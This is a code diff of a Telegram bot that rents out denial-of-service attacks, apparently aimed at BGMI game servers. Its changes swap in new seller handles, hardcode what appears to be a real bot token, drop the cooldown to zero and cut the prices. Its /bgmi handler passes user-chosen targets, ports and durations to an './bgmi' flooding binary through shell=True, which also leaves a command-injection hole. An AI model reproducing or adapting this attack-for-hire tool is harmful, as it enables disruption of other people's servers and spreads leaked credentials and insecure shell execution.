@@ -8,10 +8,10 @@ import json
 import atexit
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('YOUR_BOT_TOKEN')
+bot = telebot.TeleBot('7443640307:AAFvBmKzSVUBQbx5rR6aryz1i8E5Uhf6viA')
 
 # Admin user IDs
-admin_id = ["YOUR_ADMIN_USER_ID"]
+admin_id = ["1069319252"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -240,11 +240,14 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Kala Jadu"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
+
+# Define a cooldown time in seconds
+COOLDOWN_TIME = 0  # 0 minute cooldown
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -253,25 +256,33 @@ def handle_bgmi(message):
 
     # Check if user is allowed to run the command and has access
     if user_id in allowed_user_ids and check_access(user_id):
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 241:
-                response = "Error: Time interval must be less than 240."
+        # Check if the user is not on cooldown
+        if user_id not in bgmi_cooldown or (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds() >= 0:
+            command = message.text.split()
+            if len(command) == 4:  # Updated to accept target, time, and port
+                target = command[1]
+                port = int(command[2])  # Convert time to integer
+                time = int(command[3])  # Convert port to integer
+                if time > 241:
+                    response = "Error: Time interval must be less than 240."
+                else:
+                    record_command_logs(user_id, '/bgmi', target, port, time)
+                    log_command(user_id, target, port, time)
+                    start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                    full_command = f"./bgmi {target} {port} {time} 500"
+                    subprocess.run(full_command, shell=True)
+                    response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            
+            # Update last command time for the user
+            bgmi_cooldown[user_id] = datetime.datetime.now()
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
+            response = f"⏳ You are on cooldown. Please wait for {remaining_time:.0f} seconds before running the command again."
     else:
         response = """❌ You Are Not Authorized To Use This Command ❌.
-                      🛒 Please Buy From @ANONYMOUSS_OP"""
+                      🛒 Please Buy From @MickeyUnb"""
 
     bot.reply_to(message, response)
 
@@ -306,8 +317,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-🚀 Buy From :@ANONYMOUSS_OP
-🚀 Official Channel : @ANONYMOUS_MODZ
+🚀 Buy From :@MickeyUnb
+🚀 Official Channel : @UnbeatableServerFreeze
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -334,8 +345,8 @@ def welcome_start(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-🚀 Buy From :@ANONYMOUSS_OP
-🚀 Official Channel :@ANONYMOUS_MODZ
+🚀 Buy From :@MickeyUnb
+🚀 Official Channel :@UnbeatableServerFreeze
 '''
     bot.reply_to(message, response)
 
@@ -360,10 +371,10 @@ Vip 🌟 :
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-1 Day-->199 Rs [ 240sec ]
-3 Day 330 Rs [ 240sec ]
-1 Week-->699 Rs [ 240sec ]
-1 Month-->899 Rs [ 240sec ]
+1 Day-->99 Rs [ 240sec ]
+3 Day 200 Rs [ 240sec ]
+1 Week-->500 Rs [ 240sec ]
+1 Month-->900 Rs [ 240sec ]
 '''
     bot.reply_to(message, response)
 
